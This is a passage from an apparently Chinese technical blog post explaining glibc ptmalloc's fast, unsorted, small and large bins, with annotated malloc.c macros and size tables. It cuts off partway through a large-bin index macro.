的大小，bins 被分为如下几种类型：</p><ul><li>Fast bin;</li><li>Unsorted bin;</li><li>Small bin;</li><li>Large bin.</li></ul><p>保存这些 bins 的字段为：</p><p><a href="https://github.com/sploitfun/lsploits/blob/master/glibc/malloc/malloc.c#L1680">fastbinsY</a>: 这个数组用以保存 fast bins；</p><p>bins: 这个数组用于保存 unsorted bin、small bins 以及 large bins，共计可容纳 126 个，其中：</p><ul><li>Bin 1: unsorted bin;</li><li>Bin 2 - 63: small bins;</li><li>Bin 64 - 126: large bins.</li></ul><p><code>malloc_state</code>中的定义</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> NBINS 128</span></span><br><span class="line"><span class="comment">/* Normal bins packed as described above */</span></span><br><span class="line">mchunkptr bins[ NBINS * <span class="number">2</span> - <span class="number">2</span> ];</span><br></pre></td></tr></table></figure><table><thead><tr><th>含义</th><th>bin1 的 fd/bin2 的 prev_size</th><th>bin1 的 bk/bin2 的 size</th><th>bin2 的 fd/bin3 的 prev_size</th><th>bin2 的 bk/bin3 的 size</th></tr></thead><tbody><tr><td>bin下标</td><td>0</td><td>1</td><td>2</td><td>3</td></tr></tbody></table><p>bin的通用宏定义</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span> *<span class="title">mbinptr</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* addressing -- note that bin_at(0) does not exist */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> bin_at(m, i)                                                           \</span></span><br><span class="line">    (mbinptr)(((<span class="keyword">char</span> *) &amp;((m)-&gt;bins[ ((i) <span class="number">-1</span>) * <span class="number">2</span> ])) -                        \</span><br><span class="line">              offsetof(struct malloc_chunk, fd))</span><br><span class="line"></span><br><span class="line"><span class="comment">/* analog of ++bin */</span></span><br><span class="line"><span class="comment">//获取下一个bin的地址</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> next_bin(b) ((mbinptr)((char *) (b) + (sizeof(mchunkptr) &lt;&lt; 1)))</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* Reminders about list directionality within bins */</span></span><br><span class="line"><span class="comment">// 这两个宏可以用来遍历bin</span></span><br><span class="line"><span class="comment">// 获取 bin 的位于链表头的 chunk</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> first(b) ((b)-&gt;fd)</span></span><br><span class="line"><span class="comment">// 获取 bin 的位于链表尾的 chunk</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> last(b) ((b)-&gt;bk)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* 根据 chunk 的大小统一地获得 chunk 所在的索引 */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> bin_index(sz)                                                          \</span></span><br><span class="line">    ((in_smallbin_range(sz)) ? smallbin_index(sz) : largebin_index(sz))</span><br></pre></td></tr></table></figure><h4 id="Fast-bin"><a href="#Fast-bin" class="headerlink" title="Fast bin"></a>Fast bin</h4><p>在所有的 bins 中，fast bins 路径享有最快的内存分配及释放速度。</p><p>默认情况下（<strong>32 位系统为例</strong>）， fastbin 中默认支持最大的 chunk 的数据空间大小为 64 字节。但是其可以支持的 chunk 的数据空间最大为 80 字节。除此之外， fastbin 最多可以支持的 bin 的个数为 10 个，从数据空间为 8 字节开始一直到 80 字节（注意这里说的是<strong>数据空间</strong>大小，也即除去 prev_size 和 size 字段部分的大小）</p><blockquote><p>fastbin的数量和CPU位数有关，但本质都是从小到大递增8或16字节(<code>SIZE_SZ * 2</code>)，直至其最大的大小<code>80 * SIZE_SZ / 4</code>。 最大size为<code>80 * SIZE_SZ / 4</code>，32位下是80字节，64位为160字节。[^ 4]</p></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> NFASTBINS (fastbin_index(request2size(MAX_FAST_SIZE)) + 1)</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifndef</span> DEFAULT_MXFAST</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> DEFAULT_MXFAST (64 * SIZE_SZ / 4)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* The maximum fastbin request size we support */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MAX_FAST_SIZE (80 * SIZE_SZ / 4)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">   Since the lowest 2 bits in max_fast don&#x27;t matter in size comparisons,</span></span><br><span class="line"><span class="comment">   they are used as flags.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">   FASTCHUNKS_BIT held in max_fast indicates that there are probably</span></span><br><span class="line"><span class="comment">   some fastbin chunks. It is set true on entering a chunk into any</span></span><br><span class="line"><span class="comment">   fastbin, and cleared only in malloc_consolidate.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">   The truth value is inverted so that have_fastchunks will be true</span></span><br><span class="line"><span class="comment">   upon startup (since statics are zero-filled), simplifying</span></span><br><span class="line"><span class="comment">   initialization checks.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="comment">//判断分配区是否有 fast bin chunk，1表示没有</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> FASTCHUNKS_BIT (1U)</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> have_fastchunks(M) (((M)-&gt;flags &amp; FASTCHUNKS_BIT) == 0)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> clear_fastchunks(M) catomic_or(&amp;(M)-&gt;flags, FASTCHUNKS_BIT)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> set_fastchunks(M) catomic_and(&amp;(M)-&gt;flags, ~FASTCHUNKS_BIT)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">   NONCONTIGUOUS_BIT indicates that MORECORE does not return contiguous</span></span><br><span class="line"><span class="comment">   regions.  Otherwise, contiguity is exploited in merging together,</span></span><br><span class="line"><span class="comment">   when possible, results from consecutive MORECORE calls.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">   The initial value comes from MORECORE_CONTIGUOUS, but is</span></span><br><span class="line"><span class="comment">   changed dynamically if mmap is ever used as an sbrk substitute.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="comment">// MORECORE是否返回连续的内存区域。</span></span><br><span class="line"><span class="comment">// 主分配区中的MORECORE其实为sbr()，默认返回连续虚拟地址空间</span></span><br><span class="line"><span class="comment">// 非主分配区使用mmap()分配大块虚拟内存，然后进行切分来模拟主分配区的行为</span></span><br><span class="line"><span class="comment">// 而默认情况下mmap映射区域是不保证虚拟地址空间连续的，所以非主分配区默认分配非连续虚拟地址空间。</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> NONCONTIGUOUS_BIT (2U)</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> contiguous(M) (((M)-&gt;flags &amp; NONCONTIGUOUS_BIT) == 0)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> noncontiguous(M) (((M)-&gt;flags &amp; NONCONTIGUOUS_BIT) != 0)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> set_noncontiguous(M) ((M)-&gt;flags |= NONCONTIGUOUS_BIT)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> set_contiguous(M) ((M)-&gt;flags &amp;= ~NONCONTIGUOUS_BIT)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* ARENA_CORRUPTION_BIT is set if a memory corruption was detected on the</span></span><br><span class="line"><span class="comment">   arena.  Such an arena is no longer used to allocate chunks.  Chunks</span></span><br><span class="line"><span class="comment">   allocated in that arena before detecting corruption are not freed.  */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> ARENA_CORRUPTION_BIT (4U)</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> arena_is_corrupt(A) (((A)-&gt;flags &amp; ARENA_CORRUPTION_BIT))</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> set_arena_corrupt(A) ((A)-&gt;flags |= ARENA_CORRUPTION_BIT)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">   Set value of max_fast.</span></span><br><span class="line"><span class="comment">   Use impossibly small value if 0.</span></span><br><span class="line"><span class="comment">   Precondition: there are no existing fastbin chunks.</span></span><br><span class="line"><span class="comment">   Setting the value clears fastchunk bit but preserves noncontiguous bit.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> set_max_fast(s)                                                        \</span></span><br><span class="line">    global_max_fast =                                                          \</span><br><span class="line">        (((s) == <span class="number">0</span>) ? SMALLBIN_WIDTH : ((s + SIZE_SZ) &amp; ~MALLOC_ALIGN_MASK))</span><br><span class="line">#define get_max_fast() global_max_fast</span><br></pre></td></tr></table></figure><p>ptmalloc 默认情况下会调用 set_max_fast(s) 将全局变量 global_max_fast 设置为 DEFAULT_MXFAST，也就是设置 fast bins 中 chunk 的最大值。当 MAX_FAST_SIZE 被设置为 0 时，系统就不会支持 fastbin 。</p><ul><li><p><strong>数量</strong>：10</p><ul><li>每个 fast bin 都维护着一条 free chunk 的<strong>单链表</strong>，采用单链表是因为链表中所有 chunk 的大小相等，增删 chunk 发生在链表头部即可；—— <strong>LIFO</strong></li></ul></li><li><p><strong>chunk 大小</strong>：8 字节递增</p><ul><li>fast bins 由一系列所维护 chunk 大小以 8 字节递增的 bins 组成。也即，<code>fast bin[0]</code> 维护大小为 16 字节的 chunk、<code>fast bin[1]</code> 维护大小为 24 字节的 chunk。依此类推……</li><li>指定 fast bin 中所有 chunk 大小相同；</li></ul></li><li><p>fastbin 索引</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> fastbin(ar_ptr, idx) ((ar_ptr)-&gt;fastbinsY[ idx ])</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* offset 2 to use otherwise unindexable first 2 bins */</span></span><br><span class="line"><span class="comment">// chunk size=2*size_sz*(2+idx)</span></span><br><span class="line"><span class="comment">// 这里要减2，否则的话，前两个bin没有办法索引到。</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> fastbin_index(sz)                                                      \</span></span><br><span class="line">    ((((<span class="keyword">unsigned</span> <span class="keyword">int</span>) (sz)) &gt;&gt; (SIZE_SZ == <span class="number">8</span> ? <span class="number">4</span> : <span class="number">3</span>)) - <span class="number">2</span>)</span><br></pre></td></tr></table></figure></li><li><p>在 malloc 初始化过程中，最大的 fast bin 的大小被设置为 <a href="https://github.com/sploitfun/lsploits/blob/master/glibc/malloc/malloc.c#L794">64</a> 而非 80 字节。因为默认情况下只有大小 16 ~ 64 的 chunk 被归为 fast chunk 。</p></li><li><p><strong>无需合并</strong> —— 两个相邻 chunk 不会被合并(<strong>in_use 位一直设置</strong>)。虽然这可能会加剧内存碎片化，但也大大加速了内存释放的速度！</p></li><li><p><code>malloc(fast chunk)</code></p><ul><li>初始情况下 fast chunck 最大尺寸以及 fast bin 相应数据结构均未初始化，因此即使用户请求内存大小落在 fast chunk 相应区间，服务用户请求的也将是 small bin 路径而非 fast bin 路径；</li><li>初始化后，将在计算 fast bin 索引后检索相应 bin；</li><li>相应 bin 中被检索的第一个 chunk 将被摘除并返回给用户。</li></ul></li><li><p><code>free(fast chunk)</code></p><ul><li>计算 fast bin 索引以索引相应 bin；</li><li><code>free</code> 掉的 chunk 将被添加到上述 bin 的头部。</li></ul></li></ul><p><img src="https://raw.githubusercontent.com/lc1838228782/pics/master/img/fastbin.png"></p><p>当释放的 chunk 与该 chunk 相邻的空闲 chunk 合并后的大小大于<code>FASTBIN_CONSOLIDATION_THRESHOLD</code>时，内存碎片可能比较多了，我们就需要把 fast bins 中的 chunk 都进行合并，以减少内存碎片对系统的影响。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">   FASTBIN_CONSOLIDATION_THRESHOLD is the size of a chunk in free()</span></span><br><span class="line"><span class="comment">   that triggers automatic consolidation of possibly-surrounding</span></span><br><span class="line"><span class="comment">   fastbin chunks. This is a heuristic, so the exact value should not</span></span><br><span class="line"><span class="comment">   matter too much. It is defined at half the default trim threshold as a</span></span><br><span class="line"><span class="comment">   compromise heuristic to only attempt consolidation if it is likely</span></span><br><span class="line"><span class="comment">   to lead to trimming. However, it is not dynamically tunable, since</span></span><br><span class="line"><span class="comment">   consolidation reduces fragmentation surrounding large chunks even</span></span><br><span class="line"><span class="comment">   if trimming is not used.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> FASTBIN_CONSOLIDATION_THRESHOLD (65536UL)</span></span><br><span class="line"><span class="comment">/* malloc_consolidate 函数可以将 fastbin 中所有能和其它 chunk 合并的 chunk 合并在一起。具体地参见后续的详细函数的分析。 */</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">    Chunks in fastbins keep their inuse bit set, so they cannot</span></span><br><span class="line"><span class="comment">    be consolidated with other free chunks. malloc_consolidate</span></span><br><span class="line"><span class="comment">    releases all chunks in fastbins and consolidates them with</span></span><br><span class="line"><span class="comment">    other free chunks.</span></span><br><span class="line"><span class="comment"> */</span></span><br></pre></td></tr></table></figure><h4 id="Unsorted-bin"><a href="#Unsorted-bin" class="headerlink" title="Unsorted bin"></a>Unsorted bin</h4><p>当 small chunk 和 large chunk 被 <code>free</code> 掉时，它们并非被添加到各自的 bin 中，而是被添加在 「<strong>unsorted bin</strong>」 中。这使得分配器可以重新使用最近 <code>free</code> 掉的 chunk，从而消除了寻找合适 bin 的时间开销，进而加速了内存分配及释放的效率。</p><p>unsorted bin 可以视为空闲 chunk 回归其所属 bin 之前的缓冲区。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">   Unsorted chunks</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">    All remainders from chunk splits, as well as all returned chunks,</span></span><br><span class="line"><span class="comment">    are first placed in the &quot;unsorted&quot; bin. They are then placed</span></span><br><span class="line"><span class="comment">    in regular bins after malloc gives them ONE chance to be used before</span></span><br><span class="line"><span class="comment">    binning. So, basically, the unsorted_chunks list acts as a queue,</span></span><br><span class="line"><span class="comment">    with chunks being placed on it in free (and malloc_consolidate),</span></span><br><span class="line"><span class="comment">    and taken off (to be either used or placed in bins) in malloc.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">    The NON_MAIN_ARENA flag is never set for unsorted chunks, so it</span></span><br><span class="line"><span class="comment">    does not have to be taken into account in size comparisons.</span></span><br><span class="line"><span class="comment"> */</span></span><br></pre></td></tr></table></figure><p><strong>存疑</strong>  unsorted bin中的chunk<code>NON_MAIN_ARENA </code>总是为0。<a href="https://evilpan.com/2020/04/12/glibc-heap-exp/">^4</a></p><ul><li><p><strong>数量</strong>：1</p></li><li><p>unsorted bin 包括一个用于保存 free chunk 的双向循环链表（又名 binlist）；</p></li><li><p><strong>chunk 大小</strong>：无限制，任何大小的 chunk 均可添加到这里。</p></li><li><p>来源</p><ul><li>当一个较大的 chunk 被分割成两半后，如果剩下的部分大于 MINSIZE，就会被放到 unsorted bin 中。</li><li>释放一个不属于 fast bin 的 chunk，并且该 chunk 不和 top chunk 紧邻时，该 chunk 会被首先放到 unsorted bin 中。关于 top chunk 的解释，请参考下面的介绍。</li></ul><p>此外，Unsorted Bin 在使用的过程中，采用的遍历顺序是 <strong>FIFO</strong>，<strong>头插尾取</strong> 。</p></li></ul><p><img src="https://raw.githubusercontent.com/lc1838228782/pics/master/img/unsortedsmalllarge.png"></p><p><strong>unsorted bin位置</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* The otherwise unindexable 1-bin is used to hold unsorted chunks. */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> unsorted_chunks(M) (bin_at(M, 1))</span></span><br></pre></td></tr></table></figure><h4 id="Small-bin"><a href="#Small-bin" class="headerlink" title="Small bin"></a>Small bin</h4><p>在内存分配回收的速度上，small bin 比 large bin 更快。small bins 中每个 chunk 的大小与其所在的 bin 的 index 的关系为：chunk_size = 2 * SIZE_SZ *index，具体如下</p><table><thead><tr><th>下标(from 1)</th><th>SIZE_SZ=4(32 bit)</th><th>SIZE_SZ=8(64 bit)</th></tr></thead><tbody><tr><td>2</td><td>16</td><td>32</td></tr><tr><td>3</td><td>24</td><td>48</td></tr><tr><td>4</td><td>32</td><td>64</td></tr><tr><td>5</td><td>40</td><td>80</td></tr><tr><td>x</td><td>2*4*x</td><td>2*8*x</td></tr><tr><td>63</td><td>504</td><td>1008</td></tr></tbody></table><ul><li><p><strong>数量</strong>：62</p><p>每个 small bin 都维护着一条 free chunk 的双向循环链表。采用双向链表的原因是，small bins 中的 chunk 可能会从链表中部摘除。这里新增项放在链表的头部位置，而从链表的尾部位置移除项。—— <strong>FIFO</strong></p></li><li><p><strong>chunk 大小</strong>：</p><ul><li><p>small bin 链表中的 chunk 大小相差的字节数为 <strong>2 个机器字长</strong>，即 32 位相差 8 字节，64 位相差 16 字节。</p><p>举例而言(32bit)，<code>small bin[0]</code> （Bin 2）维护着大小为 16 字节的 chunks、<code>small bin[1]</code>（Bin 3）维护着大小为 24 字节的 chunks ，依此类推……</p></li><li><p>指定 small bin 中所有 chunk 大小均相同，因此无需排序；</p></li></ul></li><li><p>合并 —— 相邻的 free chunk 将被合并，这减缓了内存碎片化，但是减慢了 <code>free</code> 的速度；</p></li><li><p><code>malloc(small chunk)</code></p><ul><li>初始情况下，small bins 都是 NULL，因此尽管用户请求 small chunk ，提供服务的将是 unsorted bin 路径而不是 small bin 路径；</li><li>第一次调用 <code>malloc</code> 时，维护在 malloc_state 中的 small bins 和 large bins 将被初始化，它们都会指向自身以表示其为空；</li><li>此后当 small bin 非空，相应的 bin 会摘除其中最后一个 chunk 并返回给用户；</li></ul></li><li><p><code>free(small chunk)</code></p><ul><li><code>free</code> chunk 的时候，检查其前后的 chunk 是否空闲，若是则合并，也即把它们从所属的链表中摘除并合并成一个新的 chunk，新 chunk 会添加在 unsorted bin 的前端。</li></ul></li></ul><p>smallbin相关宏</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> NSMALLBINS 64</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> SMALLBIN_WIDTH MALLOC_ALIGNMENT</span></span><br><span class="line"><span class="comment">// 是否需要对small bin的下标进行纠正</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> SMALLBIN_CORRECTION (MALLOC_ALIGNMENT &gt; 2 * SIZE_SZ)</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MIN_LARGE_SIZE ((NSMALLBINS - SMALLBIN_CORRECTION) * SMALLBIN_WIDTH)</span></span><br><span class="line"><span class="comment">//判断chunk的大小是否在small bin范围内</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> in_smallbin_range(sz)                                                  \</span></span><br><span class="line">    ((<span class="keyword">unsigned</span> <span class="keyword">long</span>) (sz) &lt; (<span class="keyword">unsigned</span> <span class="keyword">long</span>) MIN_LARGE_SIZE)</span><br><span class="line"><span class="comment">// 根据chunk的大小得到small bin对应的索引。</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> smallbin_index(sz)                                                     \</span></span><br><span class="line">    ((SMALLBIN_WIDTH == <span class="number">16</span> ? (((<span class="keyword">unsigned</span>) (sz)) &gt;&gt; <span class="number">4</span>)                          \</span><br><span class="line">                           : (((<span class="keyword">unsigned</span>) (sz)) &gt;&gt; <span class="number">3</span>)) +                       \</span><br><span class="line">     SMALLBIN_CORRECTION)</span><br></pre></td></tr></table></figure><h4 id="Large-bin"><a href="#Large-bin" class="headerlink" title="Large bin"></a>Large bin</h4><p>大小大于等于<code>MIN_LARGE_SIZE</code> 字节的 chunk 被称为「<strong>large chunk</strong>」，而保存 large chunks 的 bin 被称为 「<strong>large bin</strong>」。在内存分配回收的速度上，large bin 比 small bin 慢。</p><p>large bins 中的每一个 bin 都包含一定范围内的 chunk，其中的 chunk 按 fd_nextsize 指针的顺序<strong>从大到小排列</strong>。相同大小的 chunk 同样按照最近使用顺序排列。</p><p><img src="https://raw.githubusercontent.com/lc1838228782/pics/master/img/large_bin2.png" alt="large bin"></p><ul><li>数量：63<ul><li>每个 large bin 都维护着一条 free chunk 的双向循环链表。采用双向链表的原因是，large bins 中的 chunk 可能会从链表中的任意位置插入及删除。</li><li>这 63 个 bins<ul><li>32 个 bins 所维护的 chunk 大小以 64B 递增，也即 <code>large chunk[0]</code>(Bin 65) 维护着大小为 512B ~ 568B 的 chunk 、<code>large chunk[1]</code>(Bin 66) 维护着大小为 576B ~ 632B 的 chunk，依此类推……</li><li>16 个 bins 所维护的 chunk 大小以 512 字节递增；</li><li>8 个 bins 所维护的 chunk 大小以 4096 字节递增；</li><li>4 个 bins 所维护的 chunk 大小以 32768 字节递增；</li><li>2 个 bins 所维护的 chunk 大小以 262144 字节递增；</li><li>1 个 bin 维护所有剩余 chunk 大小；</li></ul></li><li>不像 small bin ，large bin 中所有 chunk 大小不一定相同，各 chunk 大小递减保存。最大的 chunk 保存头端，而最小的 chunk 保存在尾端；</li></ul></li><li>合并 —— 两个相邻的空闲 chunk 会被合并；</li><li><code>malloc(large chunk)</code><ul><li>初始情况下，large bin 都会是 NULL，因此尽管用户请求 large chunk ，提供服务的将是 next largetst bin 路径而不是 large bin 路径 。</li><li>第一次调用 <code>malloc</code> 时，维护在 malloc_state 中的 small bin 和 large bin 将被初始化，它们都会指向自身以表示其为空；</li><li>此后当 large bin 非空，如果相应 bin 中的最大 chunk 大小大于用户请求大小，分配器就从该 bin 顶端遍历到尾端，以找到一个大小最接近用户请求的 chunk。一旦找到，相应 chunk 就会被切分成两块：<ul><li>User chunk（用户请求大小）—— 返回给用户；</li><li>Remainder chunk （剩余大小）—— 添加到 unsorted bin。</li></ul></li><li>如果相应 bin 中的最大 chunk 大小小于用户请求大小，分配器就会扫描 binmaps，从而查找最小非空 bin。如果找到了这样的 bin，就从中选择合适的 chunk 并切割给用户；反之就使用 top chunk 响应用户请求。</li></ul></li><li><code>free(large chunk)</code> —— 类似于 small chunk 。</li></ul><p><strong>largebin相关宏</strong></p><p>这里我们以 32 位平台下，第一个 large bin 的起始 chunk 大小为例，为 512 字节，那么 512&gt;&gt;6 = 8，所以其下标为 56+8=64。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> largebin_index_32(sz)                                                  \</span></span><br><span class="line">    (((((<span class="keyword">unsigned</span> <span class="keyword">long</span>) (sz)) &gt;&gt; <span class="number">6</span>) &lt;= <span class="number">38</span>)                                     \</span><br><span class="line">         ? <span class="number">56</span> + (((<span class="keyword">unsigned</span> <span class="keyword">long</span>) (sz)) &gt;&gt; <span class="number">6</span>)                                  \</span><br><span class="line">         : ((((<span class="keyword">unsigned</span> <span class="keyword">long</span>) (sz)) &gt;&gt; <span class="number">9</span>) &lt;= <span class="number">20</span>)                               \</span><br><span class="line">               ? <span class="number">91</span> + (((<span class="keyword">unsigned</span> <span class="keyword">long</span>) (sz)) &gt;&gt; <span class="number">9</span>)                            \</span><br><span class="line">               : ((((<span class="keyword">unsigned</span> <span class="keyword">long</span>) (sz)) &gt;&gt; <span class="number">12</span>) &lt;= <span class="number">10</span>)                        \</span><br><span class="line">                     ? <span class="number">110</span> + (((<span class="keyword">unsigned</span> <span class="keyword">long</span>) (sz)) &gt;&gt; <span class="number">12</span>)                    \</span><br><span class="line">                     : ((((<span class="keyword">unsigned</span> <span class="keyword">long</span>) (sz)) &gt;&gt; <span class="number">15</span>) &lt;= <span class="number">4</span>)                   \</span><br><span class="line">                           ? <span class="number">119</span> + (((<span class="keyword">unsigned</span> <span class="keyword">long</span>) (sz)) &gt;&gt; <span class="number">15</span>)              \</span><br><span class="line">                           : ((((<span class="keyword">unsigned</span> <span class="keyword">long</span>) (sz)) &gt;&gt; <span class="number">18</span>) &lt;= <span class="number">2</span>)             \</span><br><span class="line">                                 ? <span class="number">124</span> + (((<span class="keyword">unsigned</span> <span class="keyword">long</span>) (sz)) &gt;&gt; <span class="number">18</span>)        \</span><br><span class="line">                                 : <span class="number">126</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> largebin_index_32_big(sz)                                              